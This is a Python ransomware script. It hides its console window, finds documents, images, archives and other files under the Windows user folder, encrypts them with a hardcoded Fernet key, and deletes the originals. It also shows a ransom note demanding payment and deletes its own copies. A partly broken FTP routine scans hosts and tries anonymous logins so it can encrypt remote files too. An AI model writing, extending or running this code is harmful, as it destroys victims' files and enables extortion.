#!/usr/bin/python3.8
import ftplib
import getpass
import glob
import os
import subprocess
import time
from ftplib import FTP

import nmap
import win32con
import win32gui
from cryptography.fernet import Fernet
import requests


passwords = []


def ftp_work():
    ftp_server = ftplib.FTP_TLS()
    user = 'anonymous'
    port = 21
    for password in passwords:
        return password
    host_list = []
    hosts = nmap.PortScanner
    h = hosts.all_hosts()
    host_list.append(h)
    time.sleep(5)
    while True:
        try:
            requests.get('https://kite.com')
            while True:
                pass_l = password
                for host in host_list:
                    try:
                        ftp_server.connect(host, port)
                        ftp_server.login(user, pass_l)
                    except Exception as e:
                        print(e)
                        continue
                    else:
                        ftp_server.prot_p()
                        time.sleep(5)

                        file_content = '*.*'
                        ftp_server.pwd()
                        key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="

                        for file in FTP.nlst(file_content):
                            k = key
                            f = Fernet(k)
                            try:
                                with open(file, "rb") as doc:
                                    file_data = doc.read()
                                    encrypted_data = f.encrypt(file_data)

                                with open(file + '.crypy', "wb") as doc:
                                    doc.write(encrypted_data)
                                    os.remove(file)
                            except Exception as e:
                                print(e)
                                pass
                        pass
        except requests.exceptions.ConnectionError:
            print(e)
            break
        except Exception as e:
            print(e)
            break
        else:
            pass


f_name = []
targets = ('.txt', '.docx', '.doc', '.lnk',
           '.xlsx', '.pdf', '.zip', '.ppt',
           '.jpg', '.jpeg', 'gif', '.mp3',
           '.mp4', '.svg', '.ico', '.3gp',
           'ink', '.gz', '.rar', '.wav',
           '.iso', '.java', '.html', '.css',
           '.key', '.enc')


def find_file():
    usr = getpass.getuser()
    # Get files to encrypt from current user
    path = 'C:/Users/' + usr + '/'
    for r, d, files in os.walk(path):
        for file in files:
            if file.endswith(targets):
                f_name.append(os.path.join(r, file))
                print(f_name)
                break


def encrypt_file():
    key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="
    for fn in f_name:
        k = key
        f = Fernet(k)
        try:
            with open(fn, "rb") as file:
                file_data = file.read()
                encrypted_data = f.encrypt(file_data)
            with open(fn + '.crypy', "wb") as file:
                file.write(encrypted_data)
                print(file)
                os.remove(fn)
        except Exception:
            pass


def message():
    # this function prompts a window containing the ransom message
    import gui
    gui.gui()


def ransom_note():
    # Create ransome note .txt
    usr = getpass.getuser()
    path = 'C:/Users/' + usr + '/Desktop/'
    try:
        with open(path + "RANSOM NOTE.txt", "w+") as file:
            file.write("""
WE HAVE COMPROMISED YOUR COMPUTER AND ENCRYPTED YOUR FILES
PAY UP
""")
    except Exception as e:
        print(e)
        pass


def show_ransom_note():
    # Open the created ransom note in notepad.exe
    usr = getpass.getuser()
    path = 'C:/Users/' + usr + '/Desktop/'
    note = subprocess.Popen(['notepad.exe', path + 'RANSOM NOTE.txt'])
    count = 0

    while True:
        time.sleep(0.1)
        top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if top_window == 'RANSOM NOTE - Notepad':
            pass
        else:
            note.kill()
            note = subprocess.Popen(['notepad.exe', path + 'RANSOM NOTE.txt'])
        time.sleep(10)
        count += 1
        if count == 2:
            break


def delete_ransomware():
    usr = getpass.getuser()
    ransomware_path = 'C:/Users/' + usr
    for ransomware in glob.glob(ransomware_path + '/**/ransomware.py', recursive=True):
        os.remove(ransomware)


def main():
    # Hides the terminal console to prevent suspicion while working in background
    hide = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hide, win32con.SW_HIDE)
    find_file()
    encrypt_file()
    message()
    # ransom_note()
    # show_ransom_note()
    # ftp_work()
    # delete_ransomware()


if __name__ == "__main__":
    main()
